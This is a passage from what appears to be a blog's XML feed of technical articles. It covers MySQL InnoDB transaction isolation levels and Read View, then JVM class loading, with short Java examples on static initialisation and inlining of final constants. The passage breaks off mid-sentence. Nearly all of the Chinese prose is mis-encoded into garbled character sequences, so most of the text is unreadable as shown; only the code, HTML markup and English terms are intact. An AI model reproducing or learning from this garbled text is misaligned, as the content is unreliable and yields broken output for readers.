ï¼šå¯¹åŒä¸€å­—æ®µçš„å¤šæ¬¡è¯»å–ç»“æœéƒ½æ˜¯ä¸€è‡´çš„ï¼Œé™¤éæ•°æ®æ˜¯è¢«æœ¬èº«äº‹åŠ¡è‡ªå·±æ‰€ä¿®æ”¹ï¼Œå¯ä»¥é˜»æ­¢è„è¯»å’Œä¸å¯é‡å¤è¯»ï¼Œä½†å¹»è¯»ä»æœ‰å¯èƒ½å‘ç”Ÿã€‚</li><li>SERIALIZABLE(å¯ä¸²è¡ŒåŒ–) ï¼šæœ€é«˜çš„éš”ç¦»çº§åˆ«ï¼Œå®Œå…¨æœä» ACID çš„éš”ç¦»çº§åˆ«ã€‚æ‰€æœ‰çš„äº‹åŠ¡ä¾æ¬¡é€ä¸ªæ‰§è¡Œï¼Œè¿™æ ·äº‹åŠ¡ä¹‹é—´å°±å®Œå…¨ä¸å¯èƒ½äº§ç”Ÿå¹²æ‰°ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¯¥çº§åˆ«å¯ä»¥é˜²æ­¢è„è¯»ã€ä¸å¯é‡å¤è¯»ä»¥åŠå¹»è¯»ã€‚</li></ul><p>MySQL InnoDB å­˜å‚¨å¼•æ“çš„é»˜è®¤æ”¯æŒçš„éš”ç¦»çº§åˆ«æ˜¯ <strong>REPEATABLE-READï¼ˆå¯é‡è¯»ï¼‰</strong>ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>SELECT @@tx_isolation;</code>å‘½ä»¤æ¥æŸ¥çœ‹ï¼ŒMySQL 8.0 è¯¥å‘½ä»¤æ”¹ä¸º<code>SELECT @@transaction_isolation;</code></p><p>ä»ä¸Šé¢å¯¹ SQL æ ‡å‡†å®šä¹‰äº†å››ä¸ªéš”ç¦»çº§åˆ«çš„ä»‹ç»å¯ä»¥çœ‹å‡ºï¼Œæ ‡å‡†çš„ SQL éš”ç¦»çº§åˆ«å®šä¹‰é‡Œï¼ŒREPEATABLE-READ(å¯é‡å¤è¯»)æ˜¯ä¸å¯ä»¥é˜²æ­¢å¹»è¯»çš„ã€‚</p><p>ä½†æ˜¯ï¼InnoDB å®ç°çš„ REPEATABLE-READ éš”ç¦»çº§åˆ«å…¶å®æ˜¯å¯ä»¥è§£å†³å¹»è¯»é—®é¢˜å‘ç”Ÿçš„ï¼Œä¸»è¦æœ‰ä¸‹é¢ä¸¤ç§æƒ…å†µï¼š</p><ul><li><strong>å¿«ç…§è¯»</strong>ï¼šç”± MVCC æœºåˆ¶æ¥ä¿è¯ä¸å‡ºç°å¹»è¯»ã€‚</li><li><strong>å½“å‰è¯»</strong>ï¼šä½¿ç”¨ Next-Key Lock è¿›è¡ŒåŠ é”æ¥ä¿è¯ä¸å‡ºç°å¹»è¯»ï¼ŒNext-Key Lock æ˜¯è¡Œé”ï¼ˆRecord Lockï¼‰å’Œé—´éš™é”ï¼ˆGap Lockï¼‰çš„ç»“åˆï¼Œè¡Œé”åªèƒ½é”ä½å·²ç»å­˜åœ¨çš„è¡Œï¼Œä¸ºäº†é¿å…æ’å…¥æ–°è¡Œï¼Œéœ€è¦ä¾èµ–é—´éš™é”ã€‚</li></ul><p>å› ä¸ºéš”ç¦»çº§åˆ«è¶Šä½ï¼Œäº‹åŠ¡è¯·æ±‚çš„é”è¶Šå°‘ï¼Œæ‰€ä»¥å¤§éƒ¨åˆ†æ•°æ®åº“ç³»ç»Ÿçš„éš”ç¦»çº§åˆ«éƒ½æ˜¯ READ-COMMITTED ï¼Œä½†æ˜¯ä½ è¦çŸ¥é“çš„æ˜¯ InnoDB å­˜å‚¨å¼•æ“é»˜è®¤ä½¿ç”¨ REPEATABLE-READ å¹¶ä¸ä¼šæœ‰ä»»ä½•æ€§èƒ½æŸå¤±ã€‚</p><p>InnoDB å­˜å‚¨å¼•æ“åœ¨åˆ†å¸ƒå¼äº‹åŠ¡çš„æƒ…å†µä¸‹ä¸€èˆ¬ä¼šç”¨åˆ° SERIALIZABLE éš”ç¦»çº§åˆ«ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œä¸¾ä¸ªå…·ä½“çš„ä¾‹å­æ¥è¯´æ˜è¿™å››ç§éš”ç¦»çº§åˆ«ï¼Œæœ‰ä¸€å¼ è´¦æˆ·ä½™é¢è¡¨ï¼Œé‡Œé¢æœ‰ä¸€æ¡è´¦æˆ·ä½™é¢ä¸º 100 ä¸‡çš„è®°å½•ã€‚ç„¶åæœ‰ä¸¤ä¸ªå¹¶å‘çš„äº‹åŠ¡ï¼Œäº‹åŠ¡ A åªè´Ÿè´£æŸ¥è¯¢ä½™é¢ï¼Œäº‹åŠ¡ B åˆ™ä¼šå°†æˆ‘çš„ä½™é¢æ”¹æˆ 200 ä¸‡ï¼Œä¸‹é¢æ˜¯æŒ‰ç…§æ—¶é—´é¡ºåºæ‰§è¡Œä¸¤ä¸ªäº‹åŠ¡çš„è¡Œä¸ºï¼š</p><p><img src="https://pb01.s3.bitiful.net/45.webp" alt="avatar"></p><p>åœ¨ä¸åŒéš”ç¦»çº§åˆ«ä¸‹ï¼Œäº‹åŠ¡ A æ‰§è¡Œè¿‡ç¨‹ä¸­æŸ¥è¯¢åˆ°çš„ä½™é¢å¯èƒ½ä¼šä¸åŒï¼š</p><ul><li><p><code>ã€Œè¯»æœªæäº¤ã€</code>:äº‹åŠ¡ B ä¿®æ”¹ä½™é¢åï¼Œè™½ç„¶æ²¡æœ‰æäº¤äº‹åŠ¡ï¼Œä½†æ˜¯æ­¤æ—¶çš„ä½™é¢å·²ç»å¯ä»¥è¢«äº‹åŠ¡ A çœ‹è§äº†ï¼Œäºæ˜¯äº‹åŠ¡ A ä¸­ä½™é¢ V1 æŸ¥è¯¢çš„å€¼æ˜¯ 200 ä¸‡ï¼Œä½™é¢ V2ã€V3 è‡ªç„¶ä¹Ÿæ˜¯ 200 ä¸‡äº†ï¼›</p></li><li><p><code>ã€Œè¯»å·²æäº¤ã€</code>:äº‹åŠ¡ B ä¿®æ”¹ä½™é¢åï¼Œå› ä¸ºæ²¡æœ‰æäº¤äº‹åŠ¡ï¼Œæ‰€ä»¥äº‹åŠ¡ A ä¸­ä½™é¢ V1 çš„å€¼è¿˜æ˜¯ 100 ä¸‡ï¼Œç­‰äº‹åŠ¡ B æäº¤å®Œåï¼Œæœ€æ–°çš„ä½™é¢æ•°æ®æ‰èƒ½è¢«äº‹åŠ¡ A çœ‹è§ï¼Œå› æ­¤é¢ V2ã€V3 éƒ½æ˜¯ 200 ä¸‡ï¼›</p></li><li><code>ã€Œå¯é‡å¤è¯»ã€</code>:äº‹åŠ¡ A åªèƒ½çœ‹è§å¯åŠ¨äº‹åŠ¡æ—¶çš„æ•°æ®ï¼Œæ‰€ä»¥ä½™é¢ V1ã€ä½™é¢ V2 çš„å€¼éƒ½æ˜¯ 100 ä¸‡ï¼Œå½“äº‹åŠ¡ A æäº¤äº‹åŠ¡åï¼Œå°±èƒ½çœ‹è§æœ€æ–°çš„ä½™é¢æ•°æ®äº†ï¼Œæ‰€ä»¥ä½™é¢ V3 çš„å€¼æ˜¯ 200 ä¸‡ï¼›</li><li><code>ã€Œä¸²è¡ŒåŒ–ã€</code>:äº‹åŠ¡ B åœ¨æ‰§è¡Œå°†ä½™é¢ 100 ä¸‡ä¿®æ”¹ä¸º 200 ä¸‡æ—¶ï¼Œç”±äºæ­¤å‰äº‹åŠ¡ A æ‰§è¡Œäº†è¯»æ“ä½œï¼Œè¿™æ ·å°±å‘ç”Ÿäº†è¯»å†™å†²çªï¼Œäºæ˜¯å°±ä¼šè¢«é”ä½ï¼Œç›´åˆ°äº‹åŠ¡ A æäº¤åï¼Œäº‹åŠ¡ B æ‰å¯ä»¥ç»§ç»­æ‰§è¡Œï¼Œæ‰€ä»¥ä» A çš„è§’åº¦çœ‹ï¼Œä½™é¢ V1ã€V2 çš„å€¼æ˜¯ 100 ä¸‡ï¼Œä½™é¢ V3 çš„å€¼æ˜¯ 200ä¸‡ã€‚</li></ul><p>è¿™å››ç§éš”ç¦»çº§åˆ«å…·ä½“æ˜¯å¦‚ä½•å®ç°çš„å‘¢ï¼Ÿ</p><p>å¯¹äº<code>ã€Œè¯»æœªæäº¤ã€</code>éš”ç¦»çº§åˆ«çš„äº‹åŠ¡æ¥è¯´ï¼Œå› ä¸ºå¯ä»¥è¯»åˆ°æœªæäº¤äº‹åŠ¡ä¿®æ”¹çš„æ•°æ®ï¼Œæ‰€ä»¥ç›´æ¥è¯»å–æœ€æ–°çš„æ•°æ®å°±å¥½äº†ï¼›</p><p>å¯¹äº<code>ã€Œä¸²è¡ŒåŒ–ã€</code>éš”ç¦»çº§åˆ«çš„äº‹åŠ¡æ¥è¯´ï¼Œé€šè¿‡åŠ è¯»å†™é”çš„æ–¹å¼æ¥é¿å…å¹¶è¡Œè®¿é—®ï¼›</p><p>å¯¹äº<code>ã€Œè¯»å·²æäº¤ã€</code>å’Œ<code>ã€Œå¯é‡å¤è¯»ã€</code>éš”ç¦»çº§åˆ«çš„äº‹åŠ¡æ¥è¯´ï¼Œå®ƒä»¬æ˜¯é€šè¿‡ <code>Read View</code> æ¥å®ç°çš„ï¼Œå®ƒä»¬çš„åŒºåˆ«<strong>åœ¨äºåˆ›å»º Read View çš„æ—¶æœºä¸åŒï¼Œå¤§å®¶å¯ä»¥æŠŠ Read View ç†è§£æˆä¸€ä¸ªæ•°æ®å¿«ç…§ï¼Œå°±åƒç›¸æœºæ‹ç…§é‚£æ ·ï¼Œå®šæ ¼æŸä¸€æ—¶åˆ»çš„é£æ™¯ã€‚ã€Œè¯»å·²æäº¤ã€éš”ç¦»çº§åˆ«æ˜¯åœ¨æ¯ä¸ªè¯­å¥æ‰§è¡Œå‰éƒ½ä¼šé‡æ–°ç”Ÿæˆä¸€ä¸ª Read Viewï¼Œè€Œã€Œå¯é‡å¤è¯»ã€éš”ç¦»çº§åˆ«æ˜¯ã€Œå¯åŠ¨äº‹åŠ¡æ—¶ã€ç”Ÿæˆä¸€ä¸ª Read Viewï¼Œç„¶åæ•´ä¸ªäº‹åŠ¡æœŸé—´éƒ½åœ¨ç”¨è¿™ä¸ª Read View</strong>ã€‚</p><p>æ³¨æ„ï¼Œæ‰§è¡Œäº† begin/start transaction å‘½ä»¤åï¼Œå¹¶ä¸ä»£è¡¨äº‹åŠ¡å¯åŠ¨äº†ã€‚åªæœ‰åœ¨æ‰§è¡Œè¿™ä¸ªå‘½ä»¤åï¼Œæ‰§è¡Œäº†ç¬¬ä¸€æ¡ SQL è¯­å¥ï¼Œæ‰æ˜¯äº‹åŠ¡çœŸæ­£å¯åŠ¨çš„æ—¶æœºï¼›</p><h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><ul><li>javaguide</li><li>å°æ—coding<br>â€¦</li></ul>]]></content>
      
      
      <categories>
          
          <category> æ•°æ®åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç±»åŠ è½½æœºåˆ¶</title>
      <link href="/2023/12/21/JVM4/"/>
      <url>/2023/12/21/JVM4/</url>
      
        <content type="html"><![CDATA[<h2 id="ç±»åŠ è½½æœºåˆ¶"><a href="#ç±»åŠ è½½æœºåˆ¶" class="headerlink" title="ç±»åŠ è½½æœºåˆ¶"></a>ç±»åŠ è½½æœºåˆ¶</h2><p>ç°åœ¨ï¼Œæˆ‘ä»¬å·²ç»äº†è§£äº†å­—èŠ‚ç æ–‡ä»¶çš„ç»“æ„ï¼Œä»¥åŠJVMå¦‚ä½•å¯¹å†…å­˜è¿›è¡Œç®¡ç†ï¼Œç°åœ¨åªå‰©ä¸‹æœ€åä¸€ä¸ªè°œå›¢ç­‰å¾…è§£å¼€äº†ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„ç±»å­—èŠ‚ç æ–‡ä»¶åˆ°åº•æ˜¯å¦‚ä½•åŠ è½½åˆ°å†…å­˜ä¸­çš„ï¼ŒåŠ è½½ä¹‹ååˆä¼šåšä»€ä¹ˆäº‹æƒ…ã€‚</p><h3 id="ç±»åŠ è½½è¿‡ç¨‹"><a href="#ç±»åŠ è½½è¿‡ç¨‹" class="headerlink" title="ç±»åŠ è½½è¿‡ç¨‹"></a>ç±»åŠ è½½è¿‡ç¨‹</h3><p>é¦–å…ˆï¼Œè¦åŠ è½½ä¸€ä¸ªç±»ï¼Œä¸€å®šæ˜¯å‡ºäºæŸç§ç›®çš„çš„ï¼Œæ¯”å¦‚æˆ‘ä»¬è¦è¿è¡Œæˆ‘ä»¬çš„Javaç¨‹åºï¼Œé‚£ä¹ˆå°±å¿…é¡»è¦åŠ è½½ä¸»ç±»æ‰èƒ½è¿è¡Œä¸»ç±»ä¸­çš„ä¸»æ–¹æ³•ï¼Œåˆæˆ–æ˜¯æˆ‘ä»¬éœ€è¦åŠ è½½æ•°æ®åº“é©±åŠ¨ï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡åå°„æ¥å°†å¯¹åº”çš„æ•°æ®åº“é©±åŠ¨ç±»è¿›è¡ŒåŠ è½½ã€‚</p><p>æ‰€ä»¥ï¼Œä¸€èˆ¬åœ¨è¿™äº›æƒ…å†µä¸‹ï¼Œå¦‚æœç±»æ²¡æœ‰è¢«åŠ è½½ï¼Œé‚£ä¹ˆä¼šè¢«è‡ªåŠ¨åŠ è½½ï¼š</p><ul><li>ä½¿ç”¨newå…³é”®å­—åˆ›å»ºå¯¹è±¡æ—¶</li><li>ä½¿ç”¨æŸä¸ªç±»çš„é™æ€æˆå‘˜ï¼ˆåŒ…æ‹¬æ–¹æ³•å’Œå­—æ®µï¼‰çš„æ—¶å€™ï¼ˆå½“ç„¶ï¼Œfinalç±»å‹çš„é™æ€å­—æ®µæœ‰å¯èƒ½åœ¨ç¼–è¯‘çš„æ—¶å€™è¢«æ”¾åˆ°äº†å½“å‰ç±»çš„å¸¸é‡æ± ä¸­ï¼Œè¿™ç§æƒ…å†µä¸‹æ˜¯ä¸ä¼šè§¦å‘è‡ªåŠ¨åŠ è½½çš„ï¼‰</li><li>ä½¿ç”¨åå°„å¯¹ç±»ä¿¡æ¯è¿›è¡Œè·å–çš„æ—¶å€™ï¼ˆä¹‹å‰çš„æ•°æ®åº“é©±åŠ¨å°±æ˜¯è¿™æ ·çš„ï¼‰</li><li>åŠ è½½ä¸€ä¸ªç±»çš„å­ç±»æ—¶</li><li>åŠ è½½æ¥å£çš„å®ç°ç±»ï¼Œä¸”æ¥å£å¸¦æœ‰<code>default</code>çš„æ–¹æ³•é»˜è®¤å®ç°æ—¶</li></ul><p>æ¯”å¦‚è¿™ç§æƒ…å†µï¼Œé‚£ä¹ˆéœ€è¦ç”¨åˆ°å¦ä¸€ä¸ªç±»ä¸­çš„æˆå‘˜å­—æ®µï¼Œæ‰€ä»¥å°±å¿…é¡»å°†å¦ä¸€ä¸ªç±»åŠ è½½ä¹‹åæ‰èƒ½è®¿é—®ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(Test.str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">        <span class="keyword">static</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;æˆ‘è¢«åˆå§‹åŒ–äº†ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;æˆ‘è¢«è°ƒç”¨äº†!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å°±æ¼”ç¤ºä¸€ä¸ªä¸å¤ªå¥½ç†è§£çš„æƒ…å†µï¼Œæˆ‘ä»¬ç°åœ¨å°†é™æ€æˆå‘˜å˜é‡ä¿®æ”¹ä¸ºfinalç±»å‹çš„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(Test.str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">        <span class="keyword">static</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;æˆ‘è¢«åˆå§‹åŒ–äº†ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;æˆ‘è¢«è°ƒç”¨äº†!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨ä¸»æ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†Testç±»çš„é™æ€æˆå‘˜å˜é‡ï¼Œå¹¶ä¸”æ­¤é™æ€æˆå‘˜å˜é‡æ˜¯ä¸€ä¸ªfinalç±»å‹çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸å¯èƒ½å†å‘ç”Ÿæ”¹å˜ã€‚é‚£ä¹ˆå„ä½è§‰å¾—ï¼ŒTestç±»ä¼šåƒä¸Šé¢ä¸€æ ·è¢«åˆå§‹åŒ–å—ï¼Ÿ</p><p>æŒ‰ç…§æ­£å¸¸é€»è¾‘æ¥è¯´ï¼Œæ—¢ç„¶è¦ç”¨åˆ°å…¶ä»–ç±»ä¸­çš„å­—æ®µï¼Œé‚£ä¹ˆè‚¯å®šéœ€è¦åŠ è½½å…¶ä»–ç±»ï¼Œä½†æ˜¯è¿™é‡Œæˆ‘ä»¬ç»“æœå‘ç°ï¼Œå¹¶æ²¡æœ‰å¯¹Testç±»è¿›è¡ŒåŠ è½½ï¼Œé‚£ä¹ˆè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</p><p>åœ¨ç¼–è¯‘é˜¶æ®µï¼Œæ•´ä¸ª<code>Test.str</code>ç›´æ¥è¢«æ›¿æ¢ä¸ºäº†å¯¹åº”çš„å­—ç¬¦ä¸²ï¼ˆå› ä¸ºfinalä¸å¯èƒ½å‘ç”Ÿæ”¹å˜çš„ï¼Œç¼–è¯‘å°±ä¼šè¿›è¡Œä¼˜åŒ–ï¼Œç›´æ¥æ¥ä¸ªå­—ç¬¦ä¸²æ¯”ä½ å»åŠ è½½ç±»åœ¨è·å–å¿«å¾—å¤šä¸æ˜¯å—ï¼Œåæ­£ç»“æœéƒ½ä¸€æ ·ï¼‰ï¼Œæ‰€ä»¥è¯´ç¼–è¯‘ä¹‹åï¼Œå®é™…ä¸Šè·ŸTestç±»åŠæ¯›é’±å…³ç³»éƒ½æ²¡æœ‰äº†ã€‚</p><p>æ‰€ä»¥è¯´ï¼Œå½“ä½ åœ¨æŸäº›æƒ…å†µä¸‹ç–‘æƒ‘ä¸ºä»€ä¹ˆç±»åŠ è½½äº†æˆ–æ˜¯æ²¡æœ‰åŠ è½½æ—¶ï¼Œå¯ä»¥ä»å­—èŠ‚ç æŒ‡ä»¤çš„è§’åº¦å»è¿›è¡Œåˆ†æï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œåªè¦é‡åˆ°<code>new</code>ã€<code>getstatic</code>ã€<code>putstatic</code>ã€<code>invokestatic</code>è¿™äº›æŒ‡ä»¤æ—¶ï¼Œéƒ½ä¼šè¿›è¡Œç±»åŠ è½½</p><p>å¥½äº†ï¼ŒèŠå®Œäº†ç±»çš„åŠ è½½è§¦å‘æ¡ä»¶ï¼Œæˆ‘ä»¬æ¥ç€æ¥çœ‹ä¸€ä¸‹ç±»çš„è¯¦ç»†åŠ è½½æµç¨‹ã€‚</p><p><img src="https://pb01.s3.bitiful.net/136.png" alt="avatar"></p><p>é¦–å…ˆç±»çš„ç”Ÿå‘½å‘¨æœŸä¸€å…±æœ‰7ä¸ªé˜¶æ®µï¼Œè€Œé¦–å½“å…¶å†²çš„å°±æ˜¯<strong>åŠ è½½</strong>ã€‚</p><p>åŠ è½½é˜¶æ®µéœ€è¦è·å–æ­¤ç±»çš„äºŒè¿›åˆ¶æ•°æ®æµï¼Œæ¯”å¦‚æˆ‘ä»¬è¦ä»ç¡¬ç›˜ä¸­è¯»å–ä¸€ä¸ªclassæ–‡ä»¶ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡<strong>æ–‡ä»¶è¾“å…¥æµ</strong>æ¥è·å–ç±»æ–‡ä»¶çš„<code>byte[]ï¼ˆäºŒè¿›åˆ¶å­—èŠ‚æµï¼‰</code>ï¼Œä¹Ÿå¯ä»¥æ˜¯å…¶ä»–å„ç§é€”å¾„è·å–ï¼Œç”šè‡³ç½‘ç»œä¼ è¾“å¹¶åŠ è½½ä¸€ä¸ªç±»ä¹Ÿä¸æ˜¯ä¸å¯ä»¥ã€‚ç„¶åäº¤ç»™ç±»åŠ è½½å™¨è¿›è¡ŒåŠ è½½ï¼ˆç±»åŠ è½½å™¨å¯ä»¥æ˜¯JDKå†…ç½®çš„ï¼Œä¹Ÿå¯ä»¥æ˜¯å¼€å‘è€…è‡ªå·±æ’¸çš„ï¼‰ç±»çš„æ‰€æœ‰ä¿¡æ¯ä¼šè¢«åŠ è½½åˆ°æ–¹æ³•åŒºä¸­ï¼Œå¹¶ä¸”åœ¨å †å†…å­˜ä¸­ä¼šç”Ÿæˆä¸€ä¸ªä»£è¡¨å½“å‰ç±»çš„Classç±»å¯¹è±¡ï¼ˆé‚£ä¹ˆæ€è€ƒä¸€ä¸‹ï¼ŒåŒä¸€ä¸ªClassæ–‡ä»¶åŠ è½½çš„ç±»ï¼Œæ˜¯å”¯ä¸€å­˜åœ¨çš„å—ï¼Ÿï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ­¤å¯¹è±¡ä»¥åŠåå°„æœºåˆ¶æ¥è®¿é—®è¿™ä¸ªç±»çš„å„ç§ä¿¡æ¯ã€‚</p><p>æ¯ä¸ª Java ç±»éƒ½æœ‰ä¸€ä¸ªå¼•ç”¨æŒ‡å‘åŠ è½½å®ƒçš„ ClassLoader(ç±»åŠ è½½å™¨)ã€‚ä¸è¿‡ï¼Œæ•°ç»„ç±»ä¸æ˜¯é€šè¿‡ ClassLoader åˆ›å»ºçš„ï¼ˆå³<strong>ä¸ä¼šå¯¼è‡´ç±»åŠ è½½</strong>ï¼‰ï¼Œè€Œæ˜¯ JVM åœ¨éœ€è¦çš„æ—¶å€™è‡ªåŠ¨åˆ›å»ºçš„ï¼Œæ•°ç»„ç±»é€šè¿‡getClassLoader()æ–¹æ³•è·å– ClassLoader çš„æ—¶å€™å’Œè¯¥æ•°ç»„çš„å…ƒç´ ç±»å‹çš„ ClassLoader æ˜¯ä¸€è‡´çš„ã€‚</p><p>ä¸€ä¸ªéæ•°ç»„ç±»çš„åŠ è½½é˜¶æ®µï¼ˆåŠ è½½é˜¶æ®µè·å–ç±»çš„äºŒè¿›åˆ¶å­—èŠ‚æµçš„åŠ¨ä½œï¼‰æ˜¯å¯æ§æ€§æœ€å¼ºçš„é˜¶æ®µï¼Œè¿™ä¸€æ­¥æˆ‘ä»¬å¯ä»¥å»å®Œæˆè¿˜å¯ä»¥è‡ªå®šä¹‰ç±»åŠ è½½å™¨å»æ§åˆ¶å­—èŠ‚æµçš„è·å–æ–¹å¼ï¼ˆé‡å†™ä¸€ä¸ªç±»åŠ è½½å™¨çš„ loadClass() æ–¹æ³•ï¼‰ã€‚</p><p>åŠ è½½é˜¶æ®µä¸è¿æ¥é˜¶æ®µçš„éƒ¨åˆ†åŠ¨ä½œ(å¦‚ä¸€éƒ¨åˆ†å­—èŠ‚ç æ–‡ä»¶æ ¼å¼éªŒè¯åŠ¨ä½œ)æ˜¯äº¤å‰è¿›è¡Œçš„ï¼ŒåŠ è½½é˜¶æ®µå°šæœªç»“æŸï¼Œè¿æ¥é˜¶æ®µå¯èƒ½å°±å·²ç»å¼€å§‹äº†ã€‚</p><p>æ¥ç€æˆ‘ä»¬æ¥çœ‹<strong>éªŒè¯</strong>é˜¶æ®µï¼ŒéªŒè¯é˜¶æ®µç›¸å½“äºæ˜¯å¯¹åŠ è½½çš„ç±»è¿›è¡Œä¸€æ¬¡è§„èŒƒæ ¡éªŒï¼Œå¦‚æœè¯´ç±»çš„ä»»ä½•åœ°æ–¹ä¸ç¬¦åˆè™šæ‹Ÿæœºè§„èŒƒï¼Œé‚£ä¹ˆè¿™ä¸ªç±»æ˜¯ä¸ä¼šéªŒè¯é€šè¿‡çš„ï¼Œå¦‚æœæ²¡æœ‰éªŒè¯æœºåˆ¶ï¼Œé‚£ä¹ˆä¸€æ—¦å‡ºç°å±å®³è™šæ‹Ÿæœºçš„æ“ä½œï¼Œæ•´ä¸ªç¨‹åºä¼šå‡ºç°æ— æ³•é¢„æ–™çš„åæœã€‚</p><p>éªŒè¯é˜¶æ®µä¸»è¦ç”±å››ä¸ªæ£€éªŒé˜¶æ®µç»„æˆï¼š</p><ol><li>æ–‡ä»¶æ ¼å¼éªŒè¯ï¼ˆClass æ–‡ä»¶æ ¼å¼æ£€æŸ¥ï¼‰</li><li>å…ƒæ•°æ®éªŒè¯ï¼ˆå­—èŠ‚ç è¯­ä¹‰æ£€æŸ¥ï¼‰</li><li>å­—èŠ‚ç éªŒè¯ï¼ˆç¨‹åºè¯­ä¹‰æ£€æŸ¥ï¼‰</li><li>ç¬¦å·å¼•ç”¨éªŒè¯ï¼ˆç±»çš„æ­£ç¡®æ€§æ£€æŸ¥ï¼‰</li></ol><p><img src="https://pb01.s3.bitiful.net/137.png" alt="avatar"></p><p>æ–‡ä»¶æ ¼å¼éªŒè¯è¿™ä¸€é˜¶æ®µæ˜¯åŸºäºè¯¥ç±»çš„äºŒè¿›åˆ¶å­—èŠ‚æµè¿›è¡Œçš„ï¼Œä¸»è¦ç›®çš„æ˜¯ä¿è¯è¾“å…¥çš„å­—èŠ‚æµèƒ½æ­£ç¡®åœ°è§£æå¹¶å­˜å‚¨äºæ–¹æ³•åŒºä¹‹å†…ï¼Œæ ¼å¼ä¸Šç¬¦åˆæè¿°ä¸€ä¸ª Java ç±»å‹ä¿¡æ¯çš„è¦æ±‚ã€‚é™¤äº†è¿™ä¸€é˜¶æ®µä¹‹å¤–ï¼Œ<strong>å…¶ä½™ä¸‰ä¸ªéªŒè¯é˜¶æ®µéƒ½æ˜¯åŸºäºæ–¹æ³•åŒºçš„å­˜å‚¨ç»“æ„ä¸Šè¿›è¡Œçš„ï¼Œä¸ä¼šå†ç›´æ¥è¯»å–ã€æ“ä½œå­—èŠ‚æµäº†</strong>ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯<strong>å‡†å¤‡</strong>é˜¶æ®µäº†ï¼Œè¿™ä¸ªé˜¶æ®µä¼šä¸ºç±»å˜é‡åˆ†é…å†…å­˜ï¼Œå¹¶ä¸ºä¸€äº›å­—æ®µè®¾å®šåˆå§‹å€¼ï¼Œæ³¨æ„æ˜¯ç³»ç»Ÿè§„å®šçš„åˆå§‹å€¼ï¼Œä¸æ˜¯æˆ‘ä»¬æ‰‹åŠ¨æŒ‡å®šçš„åˆå§‹å€¼ã€‚</p><p>å†å¾€ä¸‹å°±æ˜¯<strong>è§£æ</strong>é˜¶æ®µï¼Œæ­¤é˜¶æ®µæ˜¯å°†å¸¸é‡æ± 